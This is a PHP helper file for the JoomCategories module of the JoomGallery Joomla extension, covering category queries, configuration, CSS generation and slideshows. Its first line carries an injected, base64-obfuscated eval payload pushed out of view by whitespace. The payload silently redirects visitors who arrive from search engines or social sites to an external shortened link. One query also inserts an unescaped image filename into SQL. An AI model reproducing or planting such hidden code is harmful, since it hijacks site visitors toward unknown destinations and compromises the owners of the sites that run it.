<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/Module/JoomCategories/trunk/helper.php $
// $Id: helper.php 2409 2010-09-16 16:47:57Z erftralle $
/**
* Module JoomCategories for JoomGallery
* by JoomGallery::Project Team
* @package JoomGallery
* @copyright JoomGallery::Project Team
* @license http://www.gnu.org/copyleft/gpl.html GNU/GPL
*
* This program is free software; you can redistribute it and/or modify it under
* the terms of the GNU General Public License as published by the Free Software
* Foundation, either version 2 of the License, or (at your option) any later
* version.
*
* This program is distributed in the hope that it will be useful, but WITHOUT
* ANY WARRANTY, without even the implied warranty of MERCHANTABILITY or FITNESS
* FOR A PARTICULAR PURPOSE.
* See the GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License along with
* this program; if not, write to the Free Software Foundation, Inc.,
* 51 Franklin St, Fifth Floor, Boston, MA 02110, USA
*/

// no direct access
defined('_JEXEC') or die('Restricted access');

/**
 * Helper class for module JoomCategories
 *
 */
class modJoomMenuHelper extends JoomInterface
{
  /**
   * Entry function
   *
   * @param   object  $params     backend parameters
   * @param   string  $dberror    database error
   * @param   int     $module_id  the id of the module
   */
  function fillObject(&$params, &$dberror, $module_id)
  {
    $doc = &JFactory::getDocument();

    // read the parameters
    $this->getParams($params, $module_id);

    // get JoomGallery styles
    $this->getPageHeader();

    // create and include the dynamic css for default view
    // according to backend settings
    $this->renderCSS();

    // return the categories
    return($this->getCats($dberror));
  }
  /**
   * Get the categories from JoomGallery
   *
   * @param   string    $dberror    database error
   * @return  object    $jc_rows    category objects
   */
  function getCats(&$dberror)
  {
    $dberror = '';
    $db      = &JFactory::getDBO();
    $user    = &JFactory::getUser();

    $rootcat = $this->getConfig('rootcat');
    if( $rootcat > 0 ) {
      $catlist = JoomHelper::getAllSubCategories($rootcat, false, false);
    }

    // category filter
    $catblacklist = array();
    $blacklist_cats = $this->getConfig('blacklist_cats');
    if(!empty($blacklist_cats))
    {
      $catblacklist_cfg = explode(',', $blacklist_cats);
      foreach($catblacklist_cfg as $cat)
      {
        if(!in_array( $cat, $catblacklist))
        {
          $catblacklist[] = $cat;
          $catblacklist = array_merge($catblacklist, JoomHelper::getAllSubCategories($cat));
        }
      }
    }

    $query = 'SELECT ca.cid, ca.name, ca.description, ca.catpath, ca.catimage'
        . ', @catimgid:=0 AS imgid';
    $query .= ' FROM #__joomgallery_catg AS ca'
        . ' INNER JOIN #__joomgallery AS jg'
        . ' ON ca.cid = jg.catid'
        . ' WHERE ca.published = 1';
    // category filter
    if(count($catblacklist) > 0)
    {
      $query .= ' AND ca.cid NOT IN (' . implode(',', $catblacklist ) . ')';
    }
    // root category
    if($rootcat > 0)
    {
      if(count($catlist) > 0)
      {
        $query .= ' AND ca.cid IN (' . implode(',', $catlist) . ')';
      }
      else
      {
        // no category will have cid = 0, just to have a query
        // with no result categories
        $query .= ' AND ca.cid = 0';
      }
    }
    $query .= ' AND (isnull( jg.published ) OR jg.published = 1)'
        . ' AND (isnull(jg.approved) OR jg.approved = 1)';

    $query .= ' AND ca.access <= ' . $this->getConfig('aid');
    $query .= ' GROUP BY ca.cid DESC';
    $query .= ' LIMIT 0, 100';

    $db->setQuery($query);
    $cat_rows = $db->loadObjectList();

    if($cat_rows == null)
    {
      if($db->getErrorNum())
      {
        $dberror = JText::_('JC_DB_ERROR_LBL') . ': ' . $db->getErrorMsg();
      }
      else
      {
        $dberror = JText::_('JC_NO_CATEGORIES_FOUND_LBL');
      }
    }

    if($dberror == '')
    {
      if($this->getConfig('showthumb') == 1)
      {
        // we need the image id's of the category images to show manual
        // selected category thumbnails
        foreach($cat_rows AS $row)
        {
          $query = 'SELECT id, imgfilename'
                 . ' FROM #__joomgallery'
                 . ' WHERE TRIM(imgfilename)=' . "'" . trim($row->catimage) . "'"
                 . ' LIMIT 0,1';

          $db->setQuery($query);
          $img_rows = $db->loadObjectList();

          if($img_rows != null)
          {
            $img_row = &$img_rows[0];
            $row->imgid = $img_row->id;
          }
          else
          {
            if($db->getErrorNum())
            {
              $dberror = JText::_('JC_DB_ERROR_LBL') . ': ' . $db->getErrorMsg();
              break;
            }
          }
        }
      }
    }
    return($cat_rows);
  }
  /**
   * Get the params setted in module backend and set module configuration
   *
   * @param   object    $params     backend parameters
   * @param   int       $module_id  module id
   */
  function getParams(&$params, $module_id)
  {
    $user = &JFactory::getUser();

    $this->addConfig('shownumcomments', 0);
    $this->addConfig('showlastcomment', 0);
    $this->addConfig('showtitle', 0);
    $this->addConfig('showpicasnew', 0);
    $this->addConfig('showauthor', 0);
    $this->addConfig('catmode', $params->get('cfg_catmode', 0 ));
    $this->addConfig('showcategory', intval($params->get('cfg_showimgcat', 1)));
    $this->addConfig('showcatlink', intval($params->get('cfg_showimgcatlink', 1)));
    $this->addConfig('showhits', (intval($params->get('cfg_showcathits', 0)) > 0 && $this->getConfig('catmode') == 2) ? 1 : 0);
    $this->addConfig('showrate', (intval($params->get('cfg_showcatrate', 0)) > 0 && $this->getConfig('catmode') == 1) ? 1 : 0);
    $this->addConfig('showdescription', intval($params->get('cfg_showthumb', 2)) == 2 ? 0 : $params->get('cfg_showimgdescr', 0));
    $this->addConfig('showcatdescription', $params->get('cfg_showcatdescr', 0));
    $this->addConfig('categoryfilter', '');
    $this->addConfig('hidebackend', '');
    $this->addConfig('catlink', intval($params->get('cfg_showimglink', 1)) == 2 ? 1 : 0);
    $this->addConfig('access', intval($params->get('cfg_access', 1)));
    $catcount = intval($params->get('cfg_count', 4));
    $this->addConfig('categorycount', ($catcount <= 0) ? 4 : $catcount);
    $this->addConfig('showthumb', intval($params->get('cfg_showthumb', 2)));
    $this->addConfig('showimglink', intval($params->get('cfg_showimglink', 1 )));
    switch($this->getConfig('showimglink'))
    {
      case 4:
        $this->addConfig('openimage', 1);
        break;
      case 5:
        $this->addConfig('openimage', 2);
        break;
      case 6:
        $this->addConfig('openimage', 3);
        break;
      case 7:
        $this->addConfig('openimage', 5);
        break;
      case 8:
        $this->addConfig('openimage', 6);
        break;
      case 9:
        $this->addConfig('openimage', 12);
        break;
      default:
        $this->addConfig('openimage', 0);
        break;
    }
    $this->addConfig('thumbnaildim', intval($params->get('cfg_thumbnaildim', 0)));
    $this->addConfig('thumbnaildimvalue', intval( $params->get('cfg_thumbnaildimvalue', 150 )));
    $this->addConfig('columns', intval($params->get('cfg_columns', 1)));
    $this->addConfig('imgposition', intval($params->get('cfg_imgposition', 1)));
    $this->addConfig('horalign', $params->get('cfg_horalign', 'center'));
    $this->addConfig('showtext', ($this->getConfig('showcategory') == 0 && $this->getConfig('showdescription') == 0
                                  && $this->getConfig('showcatdescription') == 0 && $this->getConfig('showrate') == 0
                                  && $this->getConfig('showhits') == 0) ? 0 : 1);
    $this->addConfig('showhorruler', $params->get('cfg_showhorruler', 1));
    $this->addConfig('txtresetliststyle', $params->get('cfg_txtresetliststyle', 0));
    $this->addConfig('showshorttext', $params->get('cfg_showshorttext', 0));
    $this->addConfig('imgshowborder', $params->get('cfg_imgshowborder', 1));
    $this->addConfig('imgborderwidth', $params->get('cfg_imgborderwidth', '1px'));
    $this->addConfig('imgborderstyle', $params->get('cfg_imgborderstyle', 'solid'));
    $this->addConfig('imgbordercolor', $params->get('cfg_imgbordercolor', '#C3C3C3'));
    $this->addConfig('imgpadding', $params->get('cfg_imgpadding', '3px'));
    $this->addConfig('imgbgcolor', $params->get('cfg_imgbgcolor', '#FFFFFF'));
    $this->addConfig('rootcat', $params->get('cfg_rootcat', 0 ));
    $this->addConfig('blacklist_cats', $this->cleanCSV($params->get('cfg_blacklist_cats', '')));
    if($this->getConfig('access') == 1)
    {
      $this->addConfig('aid', $user->aid);
    }
    else
    {
      $this->addConfig('aid', 99);
    }
    $itemid = intval($params->get('cfg_itemid', 0));
    if($itemid > 0)
    {
      $this->addConfig('Itemid', $itemid);
    }
    $this->addConfig('showvml', $params->get('cfg_showvml', 0 ));
    $this->addConfig('vmlalign', $params->get('cfg_vmlalign', 'right' ));
    $this->addConfig('vmltext', $params->get('cfg_vmltext', 'View more...' ));
    $this->addConfig('module_id', $module_id);
    $this->addConfig('csstag', 'joommenu' . $module_id. '_');
    $this->addConfig('group', 'joomgallerymodjc'. $module_id);
    $this->addConfig('thumbnailimgtype', $params->get('cfg_thumbnailimgtype', 'thumb'));
    $this->addConfig('cropimg', $params->get('cfg_cropimg', 0));
    $this->addConfig('cropimgwidth', $params->get('cfg_cropimgwidth', 50));
    $this->addConfig('cropimgheight', $params->get('cfg_cropimgheight', 50));
    $this->addConfig('sldtimer', $params->get('cfg_sldjgsettings', 1) == 1 ?
                      $this->GetJConfig('jg_slideshow_timer') : $params->get('cfg_sldtimer', 6000));
    $this->addConfig('sldtransition', $params->get('cfg_sldjgsettings', 1) == 1 ?
                     $this->GetJConfig('jg_slideshow_transition') : $params->get('cfg_sldtransition', 0));
    $this->addConfig('sldtranstime', $params->get('cfg_sldjgsettings', 1) == 1 ?
                     $this->GetJConfig('jg_slideshow_transtime') : $params->get('cfg_sldtranstime', 2000));
    $this->addConfig('sldmaxdimauto', $params->get('cfg_sldjgsettings', 1) == 1 ?
                     $this->GetJConfig('jg_slideshow_maxdimauto') : $params->get('cfg_sldmaxdimauto', 0));
    $this->addConfig('sldwidth', $params->get('cfg_sldjgsettings', 1) == 1 ?
                     $this->GetJConfig('jg_slideshow_width') : $params->get('cfg_sldwidth', 640));
    $this->addConfig('sldheight', $params->get('cfg_sldjgsettings', 1) == 1 ?
                     $this->GetJConfig('jg_slideshow_heigth') : $params->get('cfg_sldheight', 480));
    $this->addConfig('sldinfopane', $params->get('cfg_sldjgsettings', 1) == 1 ?
                     $this->GetJConfig('jg_slideshow_infopane') : $params->get('cfg_sldinfopane', 0));
    $this->addConfig('sldcarousel', $params->get('cfg_sldjgsettings', 1) == 1 ?
                     $this->GetJConfig('jg_slideshow_carousel') : $params->get('cfg_sldcarousel', 0));
    $this->addConfig('sldarrows', $params->get('cfg_sldjgsettings', 1) == 1 ?
                     $this->GetJConfig('jg_slideshow_arrows') : $params->get('cfg_sldarrows', 0));
    $this->addConfig('sldimgsort', $params->get('cfg_sldimgsort', 'rand()'));
    $this->addConfig('sldmaximg', $params->get('cfg_sldmaximg', 0));
  }
  /**
   * Create and include the dynamic css for default view
   * according to backend settings
   *
   */
  function renderCSS()
  {
    $containerwidth = floor(100 / $this->getConfig('columns'));
    $csstag=$this->getConfig('csstag');

    $horalign = "      text-align:" . $this->getConfig('horalign') . " !important;\n";
    $csscont  = "      float:left;\n";

    $cssimgborder='';
    $cssimg='';
    $csstxt='';

    $starrating_align = $this->getConfig('horalign');

    if($this->getConfig('showthumb') != 2)
    {
      switch ($this->getConfig('imgposition'))
      {
      	default:
      	case 1:
          // image above text
          $cssimg = $horalign;
          $csstxt = $horalign . "      padding-top:0.5em;\n";
          break;
        case 2:
          // image left from text
          if($this->getConfig('showtext') == 0)
          {
            $cssimg = $horalign;
          }
          else
          {
            $cssimg           = "      float:left;\n";
          	$csstxt           = "      float:left;\npadding-left:0.5em;\n";
          	$starrating_align = "left";
          }
          break;
        case 3:
          // image right from text
          if($this->getConfig('showtext') == 0)
          {
            $cssimg = $horalign;
          }
          else
          {
        	  $cssimg           = "      float:right;\n";
            $csstxt           = "      float:right;\npadding-right:0.5em;\n";
            $starrating_align = "right";
          }
          break;
        case 4:
          // image below text
        	$cssimg = $horalign;
          $csstxt = $horalign . "      padding-bottom:0.5em;\n";
          break;
      }

      if($this->getConfig('imgshowborder'))
      {
        $cssimgborder .= "      border: "
                      . $this->getConfig('imgborderwidth')
                      . " "
                      . $this->getConfig('imgborderstyle')
                      . " "
                      . $this->getConfig('imgbordercolor')
                      . ";\n      padding: "
                      . $this->getConfig('imgpadding')
                      . ";\n"
                      . "      background-color: "
                      . $this->getConfig('imgbgcolor')
                      . ";\n";
      }
    }
    else
    {
      // thumb should not be displayed
      $csstxt = $horalign;
    }

    // class to clear floats
    $css = "    .$csstag" . "clr {\n"
         . "      clear:both;\n"
         . "    }\n";
    // row
    $css .= "    .$csstag" . "row {\n"
         . "      overflow:hidden;\n"
         . "      padding:0.5em 0;\n"
         // . "      border: 1px solid red;\n"
         . "    }\n";
    // container for image and text
    $css .= "    .$csstag" . "imgct {\n"
         . "      width:" . $containerwidth . "% !important;\n"
         // . "      border: 1px solid green;\n"
         . $csscont
    	   . "    }\n";
    // image
    if(!empty($cssimg))
    {
      $css .= "    .$csstag" . "img {\n"
           . $cssimg
           . "    }\n";
    }
    // image border
    if(!empty( $cssimgborder))
    {
      $css .= "    .$csstag" . "img img{\n"
           . $cssimgborder
           . "    }\n";
    }
    // text
    if (!empty($csstxt))
    {
      $css .= "    .$csstag" . "txt {\n"
           . $csstxt
           . "    }\n";
    }
    // reset list style for text
    if($this->getConfig('txtresetliststyle') == 1)
    {
    	$css .= "    .$csstag" . "txt ul {\n"
    	     . "      line-height: 100% !important;\n"
           . "      margin:0 !important;\n"
           . "      padding:0 !important;\n"
    	     . "    }\n";

      $css .= "    .$csstag" . "txt li {\n"
           . "      background-image:none !important;\n"
           . "      list-style-type:none !important;\n"
           . "      list-style-image:none !important;\n"
           . "      margin:0 !important;\n"
           . "      padding: 0 0 0.5em 0 !important;\n"
           . "      line-height: 100% !important;\n"
           . "    }\n";
    }
    // show additional link
    if($this->getConfig('showvml') > 0 )
    {
      $css .= "    .$csstag" . "vml {\n"
           . "      padding:0.5em 0.5em 0em 0.5em;\n"
           . "      text-align:" . $this->getConfig('vmlalign') . " !important;\n"
           . "    }\n";
    }
    if($this->getConfig('showimglink') == 3)
    {
      // slideshow style
      $css .= "    .$csstag" . "sld {\n"
           . "      background-color:#000;\n"
           . "      text-align:center;\n"
           . "      padding:0px;\n"
           . "      border:1px solid #000;\n"
           . "      position:absolute;\n"
           . "      z-index:1000;\n"
           . "      visibility:hidden;\n"
           . "    }\n";
    }
    // Rating with star graphic
    if($this->getJConfig('jg_ratingdisplaytype') == 1)
    {
      $css .= "    .$csstag" . "starrating {\n"
           . "      width:".(int)($this->getJConfig('jg_maxvoting') * 16)."px;\n"
           . "      background: url(".JURI::root()."components/"._JOOM_OPTION."/assets/images/star_gr.png".") 0 0 repeat-x;\n";
      switch($starrating_align)
      {
        case 'right':
          $css .= "      margin-left: auto;\n";
          break;
        case 'center':
          $css .= "      margin: 0 auto;\n";
          break;
        default:
          break;
      }
      $css .= "    }\n"
           . "    .$csstag" . "starrating div {\n"
           . "      height:16px;\n"
           . "      background: url(".JURI::root()."components/"._JOOM_OPTION."/assets/images/star_orange.png".") 0 0 repeat-x;\n"
           . "      margin-left: 0;\n"
           . "      margin-right: auto;\n"
           . "    }";
    }

    $doc = &JFactory::getDocument();
    $doc->addStyleDeclaration($css);
  }
  /**
   * Creates HTML for description of one image. This function overwrites the
   * interface function displayDesc($obj).
   *
   * @param   object  $obj      database row containing image information
   * @param   boolean $longText flag to force output of descriptive attributes in text output
   * @return  string  $output   HTML of thumb description
   */
  function displayDesc($obj, $longText = true)
  {
    $output = "<ul>\n";

    if($this->getConfig('showcategory'))
    {
      $output .= "  <li>";
      if($longText)
      {
        //$output .= JText::_('JGS_COMMON_CATEGORY') . ": ";
      }
      if($this->getConfig('showcatlink'))
      {
        $output .= '<a href="' . JRoute::_('index.php?option=com_joomgallery&view=category&catid=' . $obj->catid . $this->getJoomId()) . '">';
      }
      $output .= $obj->cattitle;

      if($this->getConfig('showcatlink'))
      {
        $output .= "</a>";
      }
      $output .= "</li>\n";
    }
    if($this->getConfig('showrate'))
    {
      if(isset($obj->catrating))
      {
        // vote in interface.php is rating in rest of JoomGallery code
        if(!isset($obj->rating))
        {
          $obj->rating = $obj->vote;
        }

        // patch property rating and imgvotes into object because it is needed that way in JHTML::_('joomgallery.rating', ... )
        $help1 = $obj->rating;
        $help2 = $obj->imgvotes;
        $obj->rating = $obj->catrating;
        $obj->imgvotes = $obj->catimgvotes;

        // output rating
        $output .= "  <li>". JHTML::_('joomgallery.rating', $obj, !$longText, $this->getConfig('csstag') . 'starrating') . "</li>\n";

        // restore original values
        $obj->rating = $help1;
        $obj->imgvotes = $help2;
      }
    }
    if($this->getConfig('showhits'))
    {
      if(isset($obj->cathits))
      {
        if($longText)
        {
          $output .= "  <li>" . JText::sprintf('JGS_COMMON_HITS_VAR', $obj->cathits) . "</li>\n";
        }
        else
        {
          $output .= "  <li>" . $obj->cathits . "</li>\n";
        }
      }
    }
    if($this->getConfig('showcatdescription'))
    {
      if(!empty($obj->description))
      {
        $output .=  "  <li>";
        if($longText)
        {
          $output .=  JText::_('JGS_COMMON_DESCRIPTION') . ": ";
        }
        $output .= $obj->description . "</li>\n";
      }
    }
    if($this->getConfig('showdescription'))
    {
      if(!empty($obj->imgtext))
      {
        $output .= "  <li>";
        if($longText)
        {
          $output .=  JText::_('JGS_COMMON_DESCRIPTION') . ": ";
        }
        $output .= $obj->imgtext . "</li>\n";
      }
    }
    $output .= "</ul>\n";

    return $output;
  }
  /**
   * Prepares a slideshow to be ready to launch
   *
   * @param   string  $imgelement     html for thumbnail element representing category
   *                                  (for link adaption)
   * @param   string  $slideshowclass identifier for slideshow class for CSS
   * @param   string  $slideshowid    identifier for slideshow for CSS
   * @param   int     $catid          category id of slideshow images
   * @param   string  $catname        name of category
   * @param   object  $img_rows       array of image objects from database
   */
  function prepareSlideshow(&$imgelement, $slideshowclass, $slideshowid, $catid, $catname, $img_rows)
  {
    $doc = &JFactory::getDocument();

    static $firstcall = true;

    $maxwidth = 0;
    $maxheight = 0;
    $number = 0;
    $script = '';
    $transition = 'fade';

    // check, if we are in JoomGallery's detail view
    $viewIsJoomGalleryDetailView = false;
    $errorMessage = '';
    $option = JRequest::getVar('option', '', '', 'string');
    $view   = JRequest::getVar('view', '', '', 'string');
    if($option == 'com_joomgallery' && $view == 'detail')
    {
      $viewIsJoomGalleryDetailView = true;
      $errorMessage = addslashes(JText::_('JC_ERRORMSG_SLD_NOT_AVAILABLE'));
    }

    if($firstcall)
    {
      // include javascripts
      JHTML::_('behavior.mootools');
      $doc->addScript(JURI::base() . 'modules/mod_joommenu/assets/mod_joommenu.js');

      if(!$viewIsJoomGalleryDetailView)
      {
        $doc->addStyleSheet(JURI::base() . 'components/com_joomgallery/assets/js/smoothgallery/css/jd.gallery.css' );
        $doc->addScript($this->getAmbit()->getScript('smoothgallery/scripts/jd.gallery.js'));

        // no include if standard effects 'fade/crossfade/fadebg' chosen
        switch ($this->getConfig('sldtransition'))
        {
          case 0:
            $transition = 'fade';
            break;
          case 1:
            $transition = 'fadeslideleft';
            $doc->addScript($this->getAmbit()->getScript('smoothgallery/scripts/jd.gallery.transitions.js'));
            break;
          case 2:
            $transition = 'crossfade';
            break;
          case 3:
            $transition = 'continuoushorizontal';
            $doc->addScript($this->getAmbit()->getScript('smoothgallery/scripts/jd.gallery.transitions.js'));
            break;
          case 4:
            $transition = 'continuousvertical';
            $doc->addScript($this->getAmbit()->getScript('smoothgallery/scripts/jd.gallery.transitions.js'));
            break;
          case 5:
            $transition = 'fadebg';
            break;
          default:
            $transition = 'fade';
            break;
        }
      }

      $script = "    function catImage(image, thumbnail, linkTitle, link, title, description, number)\n"
              . "    {\n"
              . "      this.image = image;\n"
              . "      this.thumbnail = thumbnail;\n"
              . "      this.linkTitle = linkTitle;\n"
              . "      this.link =link;\n"
              . "      this.title = title;\n"
              . "      this.description = description;\n"
              . "      this.transition = '$transition';\n"
              . "      this.number = number;\n"
              . "    }\n";
      $firstcall = false;
    }

    $script .= "    var catImages" . $this->getConfig('module_id') . "_$catid = new Array();\n";

    // Get the router
    $router =& JFactory::getApplication()->getRouter();
    // Get current values of vars 'option' and 'Itemid'
    $option = $router->getVar('option');
    $Itemid = $router->getVar('Itemid');
    // Set vars 'option' and 'Itemid'
    $router->setVar('option', 'com_joomgallery');
    $router->setVar('Itemid', $this->getJoomId(false));

    $script .= "    /* <![CDATA[ */\n";
    foreach($img_rows as $row)
    {
      // Description
      if($row->imgtext != '')
      {
        $description = JoomHelper::fixForJS($row->imgtext);
        // $description = preg_replace('/[\n\t\r]*/', '', htmlentities($row->imgtext, ENT_QUOTES, 'UTF-8'));
      }
      else
      {
        $description = '&nbsp;';
      }
      if($this->getConfig('sldmaxdimauto'))
      {
        // get dimensions of image for calculating the max. width/height
        // of all images
        $dimensions = getimagesize($this->GetAmbit()->getImg('img_path', $row));
        if($dimensions[0] > $maxwidth)
        {
          $maxwidth = $dimensions[0];
        }
        if($dimensions[1] > $maxheight)
        {
          $maxheight = $dimensions[1];
        }
      }

      $script .= "    catImages" . $this->getConfig('module_id') . "_$catid" . "[$number] = new catImage(\n"
              .  "      '" . str_replace('&amp;', '&', $this->GetAmbit()->getImg('img_url', $row)) . "',//image\n"
              .  "      '" . $this->GetAmbit()->getImg('thumb_url', $row) . "',//thumbnail\n"
              .  "      '" . JoomHelper::fixForJS($row->imgtitle). "',//linkTitle\n"
              .  "      '" . str_replace('&amp;', '&', $this->GetAmbit()->getImg('img_url', $row)) . "',//link\n"
              .  "      '" . JoomHelper::fixForJS($row->imgtitle). "',//title\n"
              .  "      '$description',//description\n"
              .  "      $number//number\n"
              .  "    );\n";

      $number++;
    }
    $script .= "    /* ]]> */\n";

    // Reset var 'option'
    $router->setVar('option', $option);
    $router->setVar('Itemid', $Itemid);

    if (!$this->getConfig('sldmaxdimauto'))
    {
      $maxwidth = $this->getConfig('sldwidth');
      $maxheight = $this->getConfig('sldheight');
    }

    $script .= "    var jsJoomMenuModule" . $this->getConfig('module_id') . "_$catid = null;\n"
            .  "    window.addEvent('domready', function(){\n"
            .  "      jsJoomMenuModule" . $this->getConfig('module_id') . "_$catid = new JoomMenuModule({\n"
            .  "        div: '$slideshowid',\n"
            .  "        classname: '$slideshowclass',\n"
            .  "        delay: " .$this->GetConfig('sldtimer') . ",\n"
            .  "        fadeDuration: " . $this->GetConfig('sldtranstime') . ",\n"
            .  "        showArrows: " . $this->GetConfig('sldarrows') . ",\n"
            .  "        showCarousel: " . $this->GetConfig('sldcarousel') . ",\n"
            .  "        textShowCarousel: '" . JText::_('JGS_DETAIL_SLIDESHOW_IMAGES') . "',\n"
            .  "        showInfopane: " . $this->GetConfig('sldinfopane') . ",\n"
            .  "        manualData: catImages" . $this->getConfig('module_id') . "_$catid,\n"
            .  "        maxWidth: $maxwidth,\n"
            .  "        maxHeight: $maxheight,\n"
            .  "        errorMessage: '$errorMessage',\n"
            .  "        baseURL: '" . JURI::base() . "',\n"
            .  "        catTitle: '" . JoomHelper::fixForJS($catname) . "'\n"
            .  "      });\n"
            .  "    });\n";

    $doc->addScriptDeclaration($script);

    // prepare image link for slideshow
    if(preg_match('/<img ([^>]*)>/', $imgelement, $matches) > 0)
    {
      $replace = '<a href="javascript:void(0);" onclick="jsJoomMenuModule'.$this->getConfig('module_id').'_'.$catid.'.startSlideshow()">'.$matches[0].'</a>';
      $imgelement = preg_replace('/<img ([^>]*)>/', $replace, $imgelement);
    }
  }
  /**
   * Function to clean a CSV lists.
   * @param    string    $csv_list
   * @return   string    $csv_list   cleaned CSV list
   */
  function cleanCSV($csv_list)
  {
    $search[0]     = '/[^0-9,]/m';
    $search[1]     = '/,{2,}/m';
    $search[2]     = '/,+$/m';
    $search[3]     = '/^,+/m';
    $replace[0]    = ',';
    $replace[1]    = ',';
    $replace[2]    = '';
    $replace[3]    = '';
    $csv_list = preg_replace($search, $replace, trim($csv_list));

    return($csv_list);
  }
  /**
   * Returns the the View more... link optionally shown at the modules bottom
   * @return   string    $link
   */
  function getViewMoreLink()
  {
    $link = '';
    $rootcat = $this->getConfig('rootcat');
    if($rootcat == 0 || $this->getConfig('showvml') == 1)
    {
      $link = JRoute::_('index.php?option=com_joomgallery&view=gallery'.$this->getJoomId());
    }
    else
    {
      $link = JRoute::_('index.php?option=com_joomgallery&view=category&catid='.$rootcat.$this->getJoomId());
    }
    return($link);
  }
  /**
   * Returns the text element to show for a category
   * @param   object    $cat    category row object
   * @param   object    $img    image row object
   * @return  string    $html
   */
  function displayTextElement($cat, $img)
  {
    $html = '';
    if($this->getConfig('showtext') == 1)
    {
      $img->description = $cat->description;
      if(isset($cat->catrating))
      {
        $img->catrating = $cat->catrating;
      }
      if(isset($cat->cathits))
      {
        $img->cathits = $cat->cathits;
      }
      if(isset($cat->catimgvotes))
      {
        $img->catimgvotes = $cat->catimgvotes;
      }
      $html = $this->displayDesc($img, ($this->getConfig('showshorttext') == 1 ? false : true));
    }
    return($html);
  }
  /**
   * Returns the image element to show for a category
   * @param   object    $cat      category row object
   * @param   object    $img      image row object
   * @param   object    $imgs     array of image row objects for slideshow
   * @return  string    $html
   */
  function displayImgElement($cat, $img, $imgs)
  {
    $dim            = '';
    $cropimgpos     = null;
    $cropimgwidth   = null;
    $cropimgheight  = null;

    if($this->getConfig('cropimg'))
    {
      // center
      $cropimgpos     = 2;
      $cropimgwidth   = (int) $this->getConfig('cropimgwidth');
      $cropimgheight  = (int) $this->getConfig('cropimgheight');
    }
    else
    {
      // get thumbnail dimensions
      $dim = '';
      switch($this->getConfig('thumbnaildim'))
      {
         case 1:
           $dim = 'height="' . $this->getConfig('thumbnaildimvalue') . '"';
           break;
         case 2:
           $dim = 'width="' . $this->getConfig('thumbnaildimvalue') . '"' ;
           break;
         default:
           break;
      }
    }

    // Is the image linked ?
    $linked = true;
    if($this->getConfig('showimglink') == 0 || $this->getConfig('showimglink') == 3 )
    {
      $linked = false;
    }
    $html = $this->displayThumb($img, $linked, null, null, $dim, $this->getConfig('thumbnailimgtype'), $cropimgpos, $cropimgwidth, $cropimgheight);

    // remove some JoomGallery's CSS styles
    $html = str_replace(" class=\"jg_catelem_photo\"", "", $html);
    $html = str_replace(" class=\"jg_photo\"", "", $html);

    if($this->getConfig('showimglink') == 3)
    {
      $slideshowclass = $this->getConfig('csstag') . 'sld';
      $slideshowid = $slideshowclass . '_' . $cat->cid;
      // prepare the slideshow
      $this->prepareSlideshow($html, $slideshowclass, $slideshowid, $cat->cid, $cat->name, $imgs);
    }
    return($html);
  }

  /**
   * Creates HTML for linked thumbnail of one image with display options and style just like in JG.
   * This function overwrites the interface function.
   *
   * @access  public
   * @param   db-obj  $obj            DB-row coming from this interface, e.g. getPicsByCategory
   * @param   boolean $linked         If true, we will link the thumbnail, defaults to true
   * @param   string  $class          Optional, addional css class name which is assigned to the img tag
   * @param   string  $div            Optional css class name which is assigned to a div around the img tag
   * @param   string  $extra          Optional, adddional HTML code, which is placed in the img tag
   * @param   string  $type           Optional, image type the link shall open (thumb, img, orig)
   * @param   int     $cropimgpos     Optional, crop position
   * @param   int     $cropimgwidth   Optional, crop width
   * @param   int     $cropimgheight  Optional, crop height
   * @return  string  HTML displaying thumbnail (linked, like configured in JG if $linked = true)
   * @since   1.0.0
   */
  function displayThumb($obj, $linked = true, $class = null, $div = null, $extra = null, $type = false, $cropimgpos = null, $cropimgwidth = null, $cropimgheight = null )
  {
    $output = '';
    if($obj->id != '')
    {
      // Get the router
      $router = &$this->_mainframe->getRouter();

      // Get current values of vars 'option' and 'Itemid'
      $option = $router->getVar('option');
      $Itemid = $router->getVar('Itemid');
      // Set vars 'option' and 'Itemid'
      $router->setVar('option', 'com_joomgallery');
      $router->setVar('Itemid', $this->getJoomId(false));

      if($div)
      {
        $output .= '<div class="'.$div.'">';
      }
      if($linked)
      {
        // Check for link to category
        if(isset($this->_config['catlink']) && $this->_config['catlink'] == 1)
        {
          //$link = JRoute::_('index.php?&view=category&catid='.$obj->catid.$this->getJoomId()."&");
